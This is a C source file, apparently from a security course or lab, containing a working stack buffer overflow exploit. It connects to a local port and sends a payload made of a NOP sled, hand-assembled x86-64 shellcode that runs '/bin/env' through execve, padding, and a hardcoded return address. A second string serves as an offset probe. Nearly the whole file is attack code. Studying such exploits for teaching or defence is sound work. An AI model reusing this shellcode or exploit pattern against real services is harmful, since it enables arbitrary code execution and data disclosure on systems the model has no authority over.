#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[224]={
    // NOPs  adjust for any offset to make array of ???
    // the return address to in the stack.
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
   
    
    // Begin execution and find the current position in memory

    // Clear the rax register to avoid NULL bytes
    0x48, 0x31, 0xC0,             // xor rax, rax
    0x48, 0x31, 0xFF,             //  xor rdi, rdi
    0x48, 0x31, 0xF6,              // xor rsi, rsi
    0x48, 0x31, 0xD2,              // xor rdx, rdx

    0x50,                          // push rax

    0x48, 0xBF, 0x2F, 0x62, 0x69,
    0x6E, 0x2F, 0x65, 0x6E, 0x76,       //mov rdi, 0x766e762f6e69622f ; "/bin/env" in reverse (little endian)

    0x57,                          // push rdi

     //; Set rdi to point to the "/bin/env" string
    0x48, 0x89, 0xE7,                // mov rdi, rsp

    0x50,                          // push rax
    0x57,                          // push rdi

    0x48, 0x89, 0xE6,                     // mov rsi, rsp


    0x48, 0x31, 0xD2,                      // xor rdx, rdx
    
    // ; Load 0x7fff into the low 16 bits of the rdx register (dx)
    0x66, 0xBA, 0xFF, 0x7F,                  //  mov dx, 0x7fff
    // ; Left shift the rdx register by 32 bits
    0x48, 0xC1, 0xE2, 0x20,                   // shl rdx, 32
    
    // ; Load 0xf7fbe6ff into the low 32 bits of rcx (ecx, this also clears the rest of rcx)
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,                //  mov ecx, 0xf7fbe6ff

    // ; Clear the low 8 bits of the rcx register (cl) without introducing null character
    0x48, 0xC1, 0xE9, 0x08,                    // shr rcx, 8  ; Shift right by 8 bits to bring back the original upper bits
    0x48, 0xC1, 0xE1, 0x08,                   // shl rcx, 8  ; Shift left by 8 bits, which clears the low 8 bits

    // ; Combine the registers using the OR instruction
    0x48, 0x09, 0xCA,                     // or rdx, rcx

    // ; Load the rdx register with the memory pointed to by the rdx register
    0x48, 0x8B, 0x12,                      // mov rdx, [rdx]
   
    // ; Setup for execve system call
    0x48, 0x31, 0xC0,                   //   xor rax, rax       ; Clear rax to ensure no higher bits are set
    0xB0, 0x3B,                       // mov al, 0x3B       ; 0x3B is the syscall number for execve in x86-64

    // ; At this point, make sure rdi, rsi, and rdx are set up appropriately for execve
    0x0F, 0x05,                        // syscall            ; Perform the execve syscall

    // ; Setup for exit system call
    0x48, 0x89, 0xC7,                     // mov rdi, rax       ; Move the return code from execve to rdi
    0x48, 0x31, 0xC0,                     // xor rax, rax       ; Clear rax to ensure no higher bits are set
    0xB0, 0x3C,                       // mov al, 0x3C       ; 0x3C is the syscall number for exit in x86-64
    0x0F, 0x05,                       // syscall            ; Perform the exit syscall

    // padding
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,

   
    // return address rsp - 216
    0xf0,0xde,0xff,0xff,
    0xff,0x7f,
    
    0x0A,0x00 // new addition
};

    // size is 226
    // therefore size of compromise should be 226-2=224
    char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx" // 20
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxx"
    "MNOPWXYZ"
    "xxxxxxxx\n";


// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, "%s", compromise);  
    fflush(outfile);
}

